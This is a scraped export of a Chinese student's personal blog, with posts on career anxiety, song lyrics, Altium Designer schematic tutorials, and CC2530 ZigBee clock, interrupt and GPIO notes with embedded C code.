没错，这一刻我以及大三了，开学一个月了，我一直焦虑着。考研？就业？找什么工作？学什么技术？时间如何安排？不喜欢自己的专业课怎么办？许许多多的问题，一直困扰着我。我一直百度啊，google啊，去知乎，去看一些公众号，B站，论坛…….一直寻找，一个适合自己的答案，，然而直到这一刻，我还是没找到答案。 ​ 也许，答案并不存在；也许，答案就是， 无论结果如何，无论要学的东西有多难，多复杂，从现在开时，一切都不晚；抓紧每一分，每一秒，埋头苦干，就是答案。不喜欢专业课，那就混个及格就行，做自己想做的事情！ ———— 工作，挣钱，学校也没多大意思！ ​ 无论结果如何，我至少努力过，不是吗？哪怕，最后去搬砖，我也认了。 C / C++​ 自己对 C 语言还是很熟悉的，至少曾经用这个语言打过一年的比赛。虽然，acm程序设计赛，用到的只是 C 语言的冰山一角。但是，由于这是我的初(处)，所以对 C 语言还是带有很大的执念的。 ​ 所以，我将重新温习一遍学过的知识，然后深入学习该语言的其他部分，查漏补缺，夯实基础！ 我的选择​ IT 行业岗位那么多，在加上自己的专业还是个物联网工程，选择一条自己喜欢的路，感兴趣的方向真的不容易。 ​ 看到班里的同学一个个都学着单片机、STM32啊啥的，加实验室，做着各种项目，各种东西；也有同学搞 java 弄得很牛，轻轻松松搞个客户端，web项目啥的；更有打 acm 比赛，区域赛拿奖，各种比赛，奖学金拿到手软；有成绩好的学霸，绩点年年四点多…….. ​ 而我呢，说实话，很羡慕啊。 ​ 有想过好好搞硬件吧，反正专业就是这，但是心里却一直对软件感兴趣；有想过，搞网络安全，但是感觉自己每一点基础，以后靠这玩意吃饭，很难；想随大流搞java，又觉得java学的人太多，自己也不太喜欢这语言；最后，看到了 C++，觉得欸还不错啊，在 Linux 环境下敲代码，应该也挺有意思，所以就有了这。 ​ 要说真正的爱好，是生物学，不是计算机；但是，既然选择了这专业，那就得从了，谁让当初自己填志愿怂了呢？ ​ C/C++方向吧，不管以后如何，就这了。 学习方法 / 路线​ 听学长说过，基础很重要，不要急着出成功，搞些项目啊啥的，应该注重打好基础；也看过许多博主的学习路线，基本上也都强调基础。所以，工作的话，可能还是先放一放，可以先考个研。本科阶段，将计算机方面的基础知识学好，这就是目前的目标了。 ​ 万变不离其宗，基础知识永远不会过时，这些东西将会是以后学习一切的基石，得牢固。 ​ 建议在边学语言基础的时候，边学习Linux的使用，在Linux命令行环境下敲代码。然后，这学期还有计算机网络的课，和数据库的课。可以后期结合 c++ 加 数据库，一并把数据库结课作业搞定，一举两得。计算机网络，得好好学，还算感兴趣，暑假学过一部分。 计算机知识体系 c++学习路线 c++学习路线 java学习路线 IT所有行业该学啥","link":"","tags":[{"name":"C/C++","slug":"C-C","permalink":"http://www.fangning.xyz.com/tags/C-C/"}]},{"title":"美好事物","date":"2020-09-22T03:34:30.000Z","path":"2020/09/22/2020.09.22 停下来听首歌/","text":"美好事物​ ——— 房东的猫 热夏 你归来 听蝉 再游于 北方 知寒 沿途 不枉为 少年 终有个 结局圆满 你看 顽皮细雨招摇过远航 修理过小店某处忽明忽暗的灯盏 你听 江水流过人家吵着要上岸 你去过烟花三月的江南 你看 秋月温柔撕破了花瓣 却只为迎着暮冬大雪纷飞时贪玩 你说 要忘却所有不愉快的片段 把美好事物纯真的走完 把疲乏往期 装进朴质的长街 把失败恋爱 藏进路人的详谈 把起舞的今日 写成诗篇 多年后 也不遗憾 把无味春风 融进街边的早餐 把仰头月色 化为潇洒的释然 把漫长的故事 变成短暂 才配得起勇敢 把忧愁聚散 又何惧放胆 让幽邃夜晚 静躺入空山","link":"","tags":[{"name":"随笔","slug":"随笔","permalink":"http://www.fangning.xyz.com/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"原理图库模型创建","date":"2020-09-21T08:19:30.000Z","path":"2020/09/21/2020.09.21原理图库模型创建2/","text":"原理图库模型创建2光耦及二极管模型的创建 利用 放置 -&gt; 多边形 可以绘制出一个二极管形状的三角形: 把填充的给改成绿色。 线条宽度改成最小。 同样的，绘制二极管前面的那条杠，也可以用同样的方法绘制出来。 圆形工具的使用: 放置圆形。 默认起始边为 0°， 终止边是 360° 通过修改这两个参数可以，建立一个半圆弧。 导入他人的原理图库 先介绍一下 Altium Designer 对文件的后缀命名方式: .SchLib : 表示原理图库文件，Schematic Libarary。 .SchDoc : 表示原理图文件。 .PcbLib : 表示Pcb库文件。 .PcbDoc : 表示Pcb文件。 导入他人原理图库文件: # 如果嫌自己画太麻烦，那就可以从别人的原理图中，寻找自己需要的 原理图模型 先下载别人的原理图 目标.SchDoc 文件 拖动到 AD 软件内部，自动打开 打开 目标.SchDoc 文件，点击 设计-&gt;生产原理图库 这是就会生成 目标原理图 文件中所用到的 原理图库 文件 如果有重复的同样元件，直接跳过就行。 然后选取其中我们需要的部分，多选 -&gt; 复制， 然后粘贴到我们自己的原理图库中，并且可以做需要的修改。 元件放置，原理图绘制 打开 .SchDoc 文件，然后打开 Components 元件库: 可以选择软件默认自带的元件库。 一般选择自己新建的 原理图元件模型库 .SchLib 。 打开元件库之后，就可以将里面的元件拖放到图纸区进行放置了。 修改图纸尺寸，在图纸的属性栏里面，Sheet Size 中可以选择 ‘A4 A3 A2’ 等大小的图纸。 绘制原理图: 先将所有需要用到的元件，把 ‘相同功能的一组’ 元件 ‘相邻的’ 放到一起。 放置 -&gt; 绘图工具 -&gt; 线 : 添加线条，将各个模块单独的 ‘框起来’。 ‘按空格键’ 可以’改变 走线方式’（直角，任意角） 移动每个元件，到所属模块分区的 ‘中间’。 导线的连接，网路标签的添加 注意：导线 与 绘图工具中的线 不是同一个东西，千万不要弄错了。ctrl + w 是绘制导线，建议直接修改成 w 快捷键进行连线。 在原理图库里面修改完元件后，右击该元件，点击更新原理图，就会相应的更改原理图中放置过的该元件。 一般先将线路连接好， 网络标签添加好， 最后再统一修改元器件的编号，以及 Value 值。 添加网络标签。放置 -&gt; 网络标签（P-&gt;N） Value 与 元件编号的统一添加 很多电阻 R1,R2… ， 电容编号 C1,C2…. 手动添加起来很麻烦，可以使用工具快速添加。 工具-&gt;标注-&gt;原理图标注（P-&gt;A-&gt;A） 处理顺序，选择Z字顺序（左到右，上到下）。 选择好需要进行修改的原理图页，以及 起始编号大小。 点击更新，即可自动进行元件编号的统一修改。 注意：如果是仿照别人的进行绘制的话，因为后期需要对照·BOM 表，也就是物料清单进行修改元器件的封装。所以，这里元件的编号，最好和别人原理图的编号一致。 Value值的话，必须对照图纸进行一个个修改了。 修改的同时，再一次检查连线、网络标签、编号是否无误！ 封装管理器。 常见封装有 0402，0604，0805啥的。 在工具-&gt;封装管理器（T-&gt;G）中可以批量查看、修改元器件的封装类型。 原理图的编译及检查 工程 -&gt; 工程管理器 中修改 错误提示等级（警告，错误，致命错误……） 常见的一些错误： 编号重复：Duplicate part Designators 器件位号重复，编号重复。 悬空：Floating Net Label 、Floating power objects 网络标签和电源对象悬空。 单端网络：Net with only one pin ，一个网络只有其中一端，另外一端没有连接到其它地方。 通过 ALT + 鼠标左键点击，可高亮显示选中的网络。 或者通过视图 -&gt; 高亮网络，可以给选中的网络进行涂颜色。 可在原理图页面看到有红色波浪线的地方，就是错误发生的地方 也可以调用 message 面板查看原理图编译错误提示信息。 对于悬空的引脚，连接一个通用 ERC 符号 ‘X’ 。放置-&gt;指示-&gt;通用符（P-&gt;V-&gt;N）。 相关经验 放置管脚，或者其他线条啥的，先不要鼠标左键防止，可以先’按 tab 键’对正需要放置的对象进行’属性设置’。 按住 ‘shift 键’ 拖动元器件，可以实现复制操作。 粘贴的时候可以 ‘按 x / y’ 实现镜像粘贴。 ‘-&gt;’ 的绘制，可以直接修改 ‘线条的 end line 属性’。 平常多选是 按住 ctrl + 鼠标左键，但是在 原理图库绘制的时候是 ‘按住 shift + 鼠标左键’ 进行多选。","link":"","tags":[{"name":"PCB","slug":"PCB","permalink":"http://www.fangning.xyz.com/tags/PCB/"}]},{"title":"Altium Designer","date":"2020-09-19T14:11:30.000Z","path":"2020/09/19/2020.09.19 Altium Designer/","text":"安装与注册https://pan.baidu.com/s/1bqSYZbXgsIJ_11mrKu74pg 密码：jykg 这个是从微信 “火耳软件” 找到资源，AD 2019 。 学习途径额，我目前所学的是 ”bilibili 凡亿教育“ 发表的免费学习视频。 他们这个教育机构做得感觉还是不错的，如果感觉白嫖的不足以满足自己，可以去花一点钱，多学点知识。 淘宝课程店：fanyedu.taobao.com 官网：fanyedu.com ——- 里面也有很多免费的课程 其他学习 PCB 设计交流的联盟论坛： PCB联盟网：pcbbar.com —— 可进行一些资料的下载，以及问题的提问。 &#x70;&#x63;&#98;&#113;&#97;&#64;&#102;&#97;&#x6e;&#121;&#45;&#101;&#x64;&#97;&#46;&#99;&#111;&#109; ———- PCB图纸公益评审提交邮箱 PCB 生产，外包，制版的话 嘉立创 凡亿PCB 工程建立工程文件* 原理图库 * 原理图 * PCB 库 * PCB * 生产文件 * ...... 新建工程 新建一个工程目录：以后所有所建立的 原理图库、原理图、PCB库、PCB 都保存到这个工程目录内。 新建原理图库 新建原理图 新建PCB库 新建PCB 元件符号的创建1234567891011121314151617181920211. 选中工程文件中的 &#x27;原理图库&#x27;2. 打开 Panels 面板 -&gt; SCH Libarary3. 再此处新建元件符号: 1) 元件符号是元件在原理图上的表现形式 2) 主要由元件 边框、管脚（管脚序号、管脚名称）、元件名称、元件说明组成。4. 注意: 1) 通过&#x27;建立管脚&#x27;来建立&#x27;电气连接&#x27;关系 2) 元件符号中的&#x27;管脚序号&#x27;是与 元件实物 的管脚一一对应的。 3) 图形不一定要与实物完全一样，那是 &#x27;封装&#x27; 所需要考虑的问题。 4) 但是 &#x27;管脚序号&#x27; 和 &#x27;名称&#x27; 一定要严格按照&#x27;元件规格书&#x27;中的说明一一对应号。6. 元件模型的几个基本参数: 1) Design Item ID：元件类型 eg: RES 2) Designator：网络标签 eg: R? # 其中问好表示通配 3) Comment：元件值，如果是电阻就是阻值，；一般设计模型的时候不需要填写。 4) Links：设置产商链接，生产渠道 5) Footprint：设置封装类型 如：0805、0602 操作技巧1234567891011121314151617181920212223242526272829301. 使用系统默认的快捷键: 1) 软件菜单栏里面，每一栏后面都有字母，表示的就是该选项的一个快捷键。 2) 每一个工具栏里面还有许多小选项，配合小选项的快捷键，两个同时按就能唤出对应窗口。2. 自定义快捷键: 1) 按照 ctrl , 然后鼠标左键点击需要设置的功能选项。 2) 就会弹出该功能多对应的快捷键设置页面。3. 设计元件原理图外形的时候，需要放置许多管脚: 1) 在放第一个管脚的时候，按 tab 键设置网络标签的属性起始值。 2) 然后一直放置的时候就是按照顺序了。4. 管脚命名，快捷方式: 1) 复制管脚名称 2) 选中需要命名的管脚，直接 ctrl + V 进行粘贴 3) 剪切板上面的名称就会直接被粘贴到管脚名称属性栏5. 关于元件取名: 1) 电阻：R1、R2、R3...... 2) 电容：C1、C2、C3...... 3) IC芯片：U1、U2、U3..... 4) 排针类：J1、J2、J3......6. 阵列试粘贴: 1) 对于那种有 20 个管脚 或者 40 个管脚的 芯片或者排针。 2) 我们不可能在耗费时间一个个来摆放吧！ 3) 所以，先复制一个排针，然后点击&#x27;编辑 -&gt; 整列式粘贴&#x27;。 4) 主增量表示，给对象 designator代号 进行递增/减。 5) 次增量表示，给对象 name名称 进行递增/减。 6) 水平/垂直放置距离，可以是&#x27;负值&#x27;。 相关经验 看一遍视频，不要边看边操作 看第二遍的时候，可以直接自己做，不会的时候，再回顾视频 这样子效率更加高 对于软件的一些相关操作 设置一个快捷键 然后练它个 50 编，增加肌肉记忆 就像盲敲打字一样，形成一个反射 学习素材 ———– 智能小车制作 链接: https://pan.baidu.com/s/1nH5MC53thHp8AdbWgxsQFw 提取码: 1111","link":"","tags":[{"name":"PCB","slug":"PCB","permalink":"http://www.fangning.xyz.com/tags/PCB/"}]},{"title":"时钟","date":"2020-09-13T14:36:30.000Z","path":"2020/09/13/2020.09.13 时钟/","text":"时钟 cc2530 在正常运行的时候，需要一个高频时钟信号，以及一个低频时钟信号。 高频时钟信号，主要共给CPU ，保证程序的正常运行。他有两个来源： 芯片内部有一个 16M 的 RC震荡电路。 也可以外接一个 32M 的高频石英晶振。 正常工作的时候，其中一个给 cpu 共给。 地频时钟信号，主要共给看门狗，睡眠定时器等片上外设。也有 2 个来源： 芯片内部 32k RC 电路。 d外接 32.768k 石英晶振。 那么四个时钟电路，具体什么时候，是那些时钟在工作呢？ CC2530 芯片默认上电的时候，是默认的两个 RC 震荡电路作为 高 低 频时钟来源。 芯片做串口工作，特别是做无线通信的时候，必须要有 32M 的石英晶振作为时钟来源。 123456789101112131415161718192021222324252627281. 高频时钟特点: 1) 两个高频时钟源，可以同时起振，产生高频时钟信号； ———— 但是&#x27;能有一个供给 cc2530&#x27;作为高频信号。 2) 两个低频时钟源，同时只能有一个起振，作为芯片的低频信号来源。2. 系统高频时钟源切换步骤: 1) 让两个高频时钟源起振。 * 为什么切换的时候需要启动两个时钟呢？ * 因为，一旦cup，没有时钟源来提供时钟信号的话，就会宕机。 * 交接的时候，肯定需要一定时间的，所以两个时钟都需要运行，保证 CPU 的无缝连接。 * &#x27;SLEEPCMD&#x27; 第二位置 0 2) 等待目标时钟源震荡稳定。 * &#x27;SLEEPSTA&#x27; 的第 6 位为 1. 时，高频 32M 时钟信号稳定。 3) 延时一小段时间 ———— 63us； * 超出 63us 也可以的 4) 不分频输出; * 不分频啥意思？ * 当然就是不把一个信号的频率进行改变咯。原来时 32Mhz，以后还是 32M * 不能给它屏蔽一半，变成 16M 或者 8M * &#x27;CLKCONCMD&#x27; 的低三位 置 000 ：表示不分频输出。 5) 选中目标高频时钟源作为系统主时钟； * &#x27;CLKCONCMD&#x27; 的第 6 位置 0：设置外接 32M 作为主时钟。 6) 确认一下当前工作时的系统时钟是不是所选的高频时钟； * &#x27;CLKCONSTA&#x27; 这个寄存器的第 6 位为 0：表示 32M 的时钟源以及作为主时钟。 代码主程序文件1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iocc2530.h&gt;#include &quot;74LS164_8LED.h&quot;void delay()&#123; int i , j; for(i = 0; i &lt; 1000; i++) for(j = 0; j &lt; 800; j++);&#125;/** 以下被注释的代码作用是将系统时钟由默认 16M RC 改成 32M XOSC 高频晶振，可以对比未改之前数码管发现，修改完的数码管显示是原来的两倍，速度快了两倍！void delayms() // 大概延时超过 63us&#123; char k = 63; while(k--);&#125;void Init32M()&#123; SLEEPCMD &amp;= 0xfb; // 1111 1011 开启两个高频时钟沿 while(SLEEPSTA &amp; 0x40); // 判断第四位是否为 1，为 1 的话稳定，等待 32 M 稳点 delayms(); CLKCONCMD &amp;= 0xf8; //1111 1000 后三位清零 不分频输出 CLKCONCMD &amp;= 0xbf; // 1011 1111 设置 32M 作为系统主时钟 while(CLKCONCMD &amp; 0x40); // 等待 32M 成功成为当前系统主时钟&#125;**/void main()&#123; char i; LS164_Cfg(); //数码管初始化操作 //Init32M(); while(1) &#123; for(i = 0; i &lt; 10; i++)&#123; LS164_BYTE(i); //让数码管显示数字 i delay(); &#125; &#125;&#125; 74LS164_8LED.h 头文件123456789#ifndef __74LS164_8LED_H__#define __74LS164_8LED_H__#include&lt;ioCC2530.h&gt;#define LS164_DATA P1_3#define LS164_CLK P1_2#define UCHAR unsigned char void LS164_Cfg();void LS164_BYTE(UCHAR Data);//P1.3 DATA P1.2 CLK#endif 两个函数文件123456789101112131415161718192021222324252627282930#include&lt;ioCC2530.h&gt;#include&quot;74LS164_8LED.h&quot;static UCHAR LED_Map[]=&#123;0x3f,0x06,0x5b,0x4f, 0x66,0x6d,0x7d,0x07, 0x7f,0x6f,0x00,0xFF&#125;; //前面 10 个元素表示 0~9 ，后面两个表示全灭和全亮void LS164_Cfg()&#123; P1SEL &amp;=~0x0C;//xxxx 00xx 配置为普通IO模式 P1DIR |=0x0C;//xxxx 11xx 配置为输出模式&#125;void LS164_BYTE(UCHAR Index) //P1.3 DATA P1.2 CLK&#123; UCHAR i=0; UCHAR Data=LED_Map[Index]; // 这里可能芯片引脚资源有限，没有用三八译码器，只用两位输入，控制8种输出，所以用了74LS164一个一个来置字 for(;i&lt;8;i++) &#123; if(0x80 &amp; Data) &#123; LS164_DATA=1; &#125; else &#123; LS164_DATA=0; &#125; Data=Data &lt;&lt; 1; LS164_CLK=0; // 置下一位 LS164_CLK=1; &#125;&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"外部中断","date":"2020-09-12T06:20:34.000Z","path":"2020/09/12/2020.09.11 外部中断/","text":"掌握所有引脚的外部中断## 概述 一个水源（EA），下面有三个组开关（P0IE、P1IE、P1IE）。每个组开关内，又分别有 8、8、5 个 I/0 口开关（中断开关 PxIEN）。 ​ 类似于水管，想要最下面的水龙头流水，就得先让最上面的水塔开关打开，然后还得把中间的总管道开关打开，最后，只需要打开龙头开关，就会有水。 ​ 因此，如果需要给某个脚配置成中断，就必须先满足，开总中断使能，组内中断使能，以及对应 I/O 口中断打开。 中断条件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354551. 初始化 IO 口工作在 &#x27;普通IO、上拉输入状态&#x27; 1) 配置 PxSEL 2) 配置 PxDIR 3) 配置 PxINP 4) 配置 P2INP2. 开 IO 口组中断。3. 开组内对应的具体某 IO 口中断。4. 配置&#x27;上升&#x27;还是&#x27;下降&#x27;沿触发: 1) 一个寄存器控制 P0-P1-P2 三组 21 个 IO 脚的中断触发类型，上升沿 或者 下降沿 ———— &#x27;PICTL&#x27; 2) 关于寄存器 PICTL 具体对应控制 IO 口的关系图，如下图所示。 &#x27;D0 控制 P0&#x27;, &#x27;D1 和 D2 控制 P1低四位 P1高四位&#x27;, &#x27;D3 控制 P2&#x27; 。5. 开中断使能 1) 开 CPU 总中断 EA = 1 2) 开小组中断控制位 ———— P0IE | P1IE | P2IE * &#x27;如果一个寄存器的首地址是 8 的倍数，结尾是 0 或 8 ， 那么改寄存器内部所有位都会被 宏定义！！！&#x27; * 反之，如果寄存器首地址不是 8 的倍数，那么该寄存器内部所有位都不会被 宏定义。 * P0IE 处于首地址为 8 的倍数的寄存器内，所以被宏定义了，可以直接赋值 P0IE = 1 * P1IE 和 P2IE 这两个其实是不被定义的，所以用不辽，需要对他们所属寄存器进行值数。 他们都处于寄存器 IEN2 中: P1IE ----&gt; IEN2 第 4 位， P2IE ----&gt; IEN2 第 1 位。 6. 写中断函数: 1) #pragma verctor = P0INT_VECTOR * #pragma 预处理，设定编译器状态，或者制定编译器完成特定动作。 * #pragma verctor 告诉编译器，&#x27;在这里设置中断服务函数入口地址&#x27; * 将 &#x27;中断服务函数入口地址&#x27; 设置为 &#x27;P0INT_VECTOR&#x27; ———— 该地址在头文件中有定义。 * 如果是其他组中断，可以改成 P1INT_VERCTOR | P2INT_VERCTOR 2)&#x27; __interrupt &#x27;: 中断函数声明关键字，后接中断函数就行了。 3) 中断函数出口之前，&#x27;清除中断标志位&#x27;：&#x27;PxIF = 0&#x27; * &#x27;小组中断标志位 PxIF&#x27; ———— 如果值为 1， 表示该小组内有中断触发。 * 为什么要清除中断标志位？ * 加入一个下降沿电位触发的中断，在接受到一个连续的下降沿的时候，中断标志位会置1。如果下降沿持续了较长时间的话，那么处理完第一个中断函数，又会不断的再次处理中断函数，因为没有消除多余的中断触发信号的影响。 * 所以，只有在处理完一个中断函数的时候，顺便清除一下中断标志位，&#x27;这样子同一时间内中断任务就只会被执行一次就够了&#x27;。 * P0IF -- P1IF -- P2IF 4) 中断是否为指定 I/O 口造成的中断: &#x27;函数结束时，也需要清零 PxIFG = 0&#x27; * &#x27;组内中断标记寄存器 ———— PxIFG&#x27; ———— 如果某一位为 1， 表示该位对应 I/O 口触发外部中断。 * 既然以及产生中断了，小组中断标志位也已经触发了，也就进入了小组中断函数入口地址。 * 但是入口地址是组内公用的，那到底具体是哪个 I/O 口引发的中断呢？ 如果同一个小组内，有多个 I/O 作为外部中断触发引脚。可是中断入口是共用的，所以必须在中断函数内，&#x27;再加一个中断标识条件，来确定是否是指定 I/O 口的中断触发&#x27;。 * if( P0IFG &amp; 0x20 == 1) 表示 P0 组第五位 I/O 口触发了中断。 此时在条件语句内写改中断函数内容就行了，就不会受到组内别的中断影响。 5) &#x27;消除&#x27;按钮抖动等&#x27;误操作触发的中断&#x27; * 按钮抖动也可能会触发中断，人工按下的话中断触发时间较长。 * 为了消除按钮抖动的影响，我们在中断触发函数内，加一个延时。 * &#x27;延时一小段时间时候，如果按钮还是按下的状态&#x27;，那么&#x27;表示是人为触发的&#x27;。如果不是，那直接跳出中断函数。 相关经验 什么是外部中断 在没有干预的情况下，单片机的程序在封闭状态下自主运行，如果在某一时刻需要响应一个外部事件(比如有按键按下)**，这时就会用到外部中断。具体来讲，外部中断就是在单片机的一个引脚上，由于外部因素导致了一个电平的变化(比如由高变低)，而通过捕获这个变化，单片机内部自主运行的程序就会被暂时打断，转而去执行相应的中断处理程序，执行完后又回到原来中断的地方继续执行原来的程序**。这个引脚上的电平变化，就申请了一个外部中断事件，而这个能申请外部中断的引脚就是外部中断的触发引脚。 给寄存器某一位位值数的时候 置0与1 ———— P0SEL &amp;= 0xfe // 1111 1110 最后一位置0 置1或0 ———— P0SEL |= 0x01 // 0000 0001 最后一位置1 给一个 0 置 1 或 给 1 置零 与 1 异或 运算。 相同结果为 0， 不相同结果为 1 . a = 1; a ^= 1; a –&gt; 0; a = 0; a ^= 1; a –&gt; 1; C 语言中没有 同或操作。 有按位取反操作 a = ~a ； #pragma optimze = none 关闭 IAR 编译器对下列函数的优化。必须放在函数外部，起始位置。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iocc2530.h&gt;void delay(int x);void main()&#123; //P0_5下，就会接受到一个下降沿（触发中断），让 led3-P0_4 灯亮（中断处理函数） P0SEL &amp;= 0xdf; //1101 1111 普通io P0SEL &amp;= 0xef; //1110 1111 普通io P0DIR &amp;= 0xdf; //1101 1111 输入 P0DIR |= 0x10; //0001 0000 输出 P0INP &amp;= 0xdf; //1101 1111 上下拉 P2INP &amp;= 0xdf; //1101 1111 上拉 EA = 1; //总中断 P0IE = 1; //小组中断 // IEN2 |= 0x10 -------&gt; P1IE = 1 这两个寄存器位地址（0x9A）不是 8 的倍数，所以不被宏定意，只能通过找到相应的寄存器置位。 // IEN2 |= 0x02 -------&gt; P2IE = 1 P0IEN |= 0x20; // 0010 0000 开组内中断 PICTL |= 0x01; // 将 P0 小组配置成下降沿触发。 while(1); //中断已开，啥都不需要管了，就等外部中断触发条件就行了。&#125;#pragma optimize = none#pragma vector = P0INT_VECTOR //设置中断函数向量，给中断函数地址__interrupt void button()&#123; if(P0IFG &amp; 0x20) //增加一个标识 确定是否时 P0_5 引发的中断 &#123; delay(30); if(P0_5 == 0) // 消除按钮抖动触发中断的情况 &#123; P0_4 = ~P0_4; // P0_4 ^= 1 如果中断触发，LED 灯亮/灭 &#125; &#125; P0IFG = 0; //清零中断标志 P0IF = 0;&#125;void delay(int x)&#123; int i, j; for(i = 0; i &lt; x; i++) for(j = 0; j &lt; 1000; j++);&#125;","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"我的随笔","date":"2020-09-11T08:22:50.000Z","path":"2020/09/11/2020.09.12 第一篇随笔/","text":"建立个人博客了特殊一年​ 2020年，全球爆发新冠状病毒，此时我正读大二下半学期。因为疫情，这一学期全国大部分学校都没开学，我也因此在家过了大半年。 ​ 也就是这段时间，我终于自己搭建了一个，一直让我心心念念的个人博客。 ​ ​ 之前看过许多大佬们的技术博客，很羡慕能够在信息爆发的互联网世界当中，有自己的一块小天地。接触互联网也已经有好几年了，不能再一直白嫖网上大佬们的技术成果了，是时候分享一波自己所学知识，回报社会 🤣😘😘😘，奉献自己的一份微薄之力！ ​ 本人以后会在这里分享自己的一些成长经历，对学习生活的一些思考，以及一些所学过的一些知识的汇总。希望可以给各位一个参考，和帮助。 ​ 大三了，时间过得很快，然而自己的技术沉淀却还很少。想把从大一大二所学的所有东西都写下来，想分享自己心里的千言万语，苦于最近实在有点忙。所以，就只能先写到这里了，以后一有时间就会更新的，相信我 😝，就这样吧 ~","link":"","tags":[{"name":"随笔","slug":"随笔","permalink":"http://www.fangning.xyz.com/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"cc2530原理图及引脚功能控制","date":"2020-09-11T00:00:00.000Z","path":"2020/09/11/2020.09.10 zigbee原理图理解/","text":"zigbee无线模块的基本工作电路原理图各部分理解12345678910111213141516171819201. 25 26 : 1) RF_P 和 RF_N 号角所连部分为&#x27;无线部分&#x27;，最后面接着一个天线。2. 40 30 : 1) 40：cdoupl 去耦电容。 2) 30 Rbias 为偏置电阻。 3) &#x27;这两个必须正确连接，8051单片机才能正常仿真、烧录程序&#x27;3. 32 33 : 1) 所连接部分接 &#x27;低频精准时钟源&#x27;。可用，可不用。 2) 主要用来做 定时器，或者 看门狗 才能用到。4. 胜达电子 与 TI cc2530基本工作电路的&#x27;不同点&#x27;: 1) 复位电路，实现按键复位 和 通电复位。 * 20 reset 脚提供程序 1us 低电平信号，即可复位。 * 20 号交接复位电路。 2) 下载程序电路 * 下载程序所需条件 电源，GND，reset，34 P2_1，35 P2_2 &#x27;五条线齐全，就可以下载程序&#x27; * 将上面五根线接入一个 JTAG下载接口 ，就可以通过仿真器进行程序烧入了！ 3) 只要有 &#x27;电源，地线，去耦电容，偏执电阻，以及程序烧录口P2_1,P2_2&#x27;，加上基本的&#x27;晶振&#x27;。&#x27;芯片就可以正常工作了！！&#x27; 如何控制 I/O 口输入/出12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849501. i/o 口: 21个 1) P0_0 ~ P0_7 2) P1_0 ~ P1_7 3) p2_0 ~ P2_4 4) 所用引脚都可以作为普通 i/o 口。 5) 部分引脚有特殊功能，可以作为&#x27;片上外设&#x27;。 # 由相应的寄存器控制。 6) 要么某一时刻作为 i/o 要么作为 片上外设，不能冲突。2. P1_0 和 P1_1 有 20mA 的驱动能力。 其余引脚只有 4mA。3. 输出如何配置: 用 P1_0 来进行输出，控制 LED 灯。 1) 先让它处于 &#x27;普通I/O口模式&#x27;，而非片上外设。 * 两种模式的切换，是由寄存器进行控制的。 * &#x27;P0SEL&#x27; | P1SEL | P2SEL 这三个寄存器分别管理 &#x27;P0&#x27; | P1 | P2 三组引脚。 * &#x27;寄存器的&#x27;其中 &#x27;0~7 位&#x27;，对应&#x27;引脚 Px_0 ~ Px_7&#x27; 。 * 每一位&#x27;是 0&#x27;，表示对应引脚为 &#x27;普通 i/o 口&#x27;。 &#x27;1&#x27; 表示为 &#x27;片上外设口&#x27;。 * 注意 P2_1 和 P2_2 一般用来作为程序烧入口，不作为 普通I/O 口。 &#x27;其他口随便用&#x27;！ 2) 其次，让 P1_0 处于输出状态。 * 输入/出 状态的控制，也是由一组寄存器进行控制的。 * &#x27;P0DIR&#x27; | P1DIR | P2DIR 这桑寄存器分别管理 &#x27;P0&#x27; | P1 | P2 三组 I/O 口 输入或输出。 * 寄存器每一位 &#x27;0&#x27; 表示对应的引脚进行 &#x27;输出&#x27;。&#x27;1 表示&#x27;对应引脚进行 &#x27;输入&#x27;。 3) 最后，根据要求，让其处于 输出 高/低 点平。 * 设置 Px_x = 0 输出高电平， Px_X = 1 输出低电平。 4. # 以上两种寄存器 PxSEL and PxDIR 默认情况下的值都是 0x00;5. 输入如何配置: 读取 P0_6 状态，高电平表示&#x27;跳线帽&#x27;断开，低电平表示&#x27;跳线帽连接&#x27;GND。&#x27;见原理图 指针和等效光敏 模块&#x27;。 1) 让 p0_6 处于普通 I/O 口状态。 P0SEL = 0 2) 让 P0_6 处于输入状态。 P0DIR = 0 3) &#x27;让 P0_6 处于上拉、下拉或者三态 中的一种状态&#x27;。 * 上拉电路，很容易理解，就是引脚与外设之间，接一个电阻与VCC电源，来提高电压。 * 下拉电路，很容易理解，就是引脚与外设之间，接一个电阻与GND接地，来减低电压。 * 那什么是&#x27;三态呢？&#x27;，就是引脚与外设之间，接一个&#x27;无穷大的电阻&#x27;。 为什么要这样做，这样做有什么作用呢？ 当我们的引脚是需要&#x27;读取&#x27;外部设备的&#x27;电压值&#x27;的时候，接&#x27;上拉或者下拉&#x27;会&#x27;影响输入结果&#x27;。此时接一个无穷大的电阻，可以保证它想断路一样，不会分压，又可以通过连通读取到接入点的电压值。 例如: 使用&#x27;热敏电阻传感器&#x27;，或者&#x27;光敏电阻传感器&#x27;的时候，传感器电压值，会随着温度变化，分压也随之变化，我们单片机就需要采集到传感器与地之间的电压值，然后计算出外界环境的变化。&#x27;ADC采集的时候一定要接三态&#x27;。 4) 那么如何设置输入引脚是处于哪一种状态呢？ 用到了另外一组寄存器 &#x27;PxINP&#x27; * &#x27;P0INP&#x27; 中的第六位 如果是 &#x27;0&#x27; 表示 P0_6 处于 &#x27;上拉|下拉&#x27; 状态。 * &#x27;P0INP&#x27; 中的第六位 如果是 &#x27;1&#x27; 表示 P0_6 处于 &#x27;三态&#x27; 状态。 * 进一步确定，到底是处于上拉，还是下拉状态呢？ 这里用到了 &#x27;P2INP的高三位&#x27;！ * 因为 P2组 实际只存在五个引脚，&#x27;高三位不存在&#x27;，所以！&#x27;P2INP 高三位是闲置的&#x27;！！ * P2INP_5 --&gt; P0组的 上拉/下拉 P2INP_6 --&gt; P1组的 上拉/下拉 P2INP_7 --&gt; P2组的 上拉/下拉 5) 因为 PxSEL, PxDIR, PxINP 三个寄存器都是默认值为0. 所以，我们说这些引脚都是默认&#x27;普通IO口 上拉 输入&#x27;。 相关经验 目前所学的控制寄存器： PxSEL：控制三组引脚的作用，外设或者普通 I/O 口。 PxDIR：控制三组引脚的 I/O 状态，输入或输出。 PxINP：控制三组引脚的输入状态 